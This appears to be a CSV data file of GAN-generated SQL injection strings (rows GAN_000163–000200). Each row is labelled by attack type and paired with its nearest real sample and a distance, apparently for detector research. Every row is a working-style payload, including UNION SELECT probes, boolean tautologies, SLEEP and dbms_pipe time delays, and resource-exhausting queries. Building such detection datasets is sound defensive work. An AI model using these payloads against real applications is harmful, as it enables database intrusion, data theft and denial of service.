+GAN_000163,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.7090123015239795
+GAN_000164,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006694,5.744619436307213
+GAN_000165,attack,boolean,"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003671,7.1848973554865685
+GAN_000166,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R006611,5.158045091635424
+GAN_000167,attack,union,"1   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001735,5.472865297665635
+GAN_000168,attack,boolean,"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",nearest_attack_euclidean,R008712,4.710410934860514
+GAN_000169,attack,union,"1 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000905,7.681653554120648
+GAN_000170,attack,boolean,-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R008049,7.287521219031539
+GAN_000171,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R002362,4.209663142805774
+GAN_000172,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003358,6.879322823582537
+GAN_000173,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,6.751434498103311
+GAN_000174,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,8.10530349718674
+GAN_000175,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",nearest_attack_euclidean,R003361,6.807795073193681
+GAN_000176,attack,boolean,"1%'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006135,6.8646359774871675
+GAN_000177,attack,union,"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",nearest_attack_euclidean,R007121,6.464218366307168
+GAN_000178,attack,union,"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",nearest_attack_euclidean,R007121,9.283269454296406
+GAN_000179,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R005630,5.826691789111618
+GAN_000180,attack,boolean,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",nearest_attack_euclidean,R001217,7.890268016856452
+GAN_000181,attack,boolean,-9389'  )   or 8859  =  3989--,nearest_attack_euclidean,R005856,9.099154711327987
+GAN_000182,attack,boolean,1'  )   and 4595  =  4595#,nearest_attack_euclidean,R000972,9.57210302563337
+GAN_000183,attack,union,"1'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R005024,5.474274886700846
+GAN_000184,attack,time,"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R005371,8.772615313185522
+GAN_000185,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R006353,7.123494059461095
+GAN_000186,attack,boolean,"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",nearest_attack_euclidean,R005584,7.864361080214538
+GAN_000187,attack,union,"-4135'   )    )     )   union all select 4413,4413,4413#",nearest_attack_euclidean,R008080,7.551057588406015
+GAN_000188,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",nearest_attack_euclidean,R007154,5.260938472630986
+GAN_000189,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R008526,7.304440229106201
+GAN_000190,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R007095,6.952330960842019
+GAN_000191,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R001976,8.491302412678301
+GAN_000192,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R006054,4.352345965916499
+GAN_000193,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R005801,9.508982144627408
+GAN_000194,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,7.2802180764026065
+GAN_000195,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,10.754082468533605
+GAN_000196,attack,boolean,"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R006322,4.957881993303086
+GAN_000197,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R005037,7.1323217264302246
+GAN_000198,attack,boolean,"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",nearest_attack_euclidean,R005077,7.971309485700468
+GAN_000199,attack,union,"-5150   )    )     )   union all select 5660,5660,5660#",nearest_attack_euclidean,R004003,4.974699318873331
+GAN_000200,attack,boolean,-7941 or   (  5822  =  8754  )  *8754-- eepn,nearest_attack_euclidean,R001200,8.63293891227163
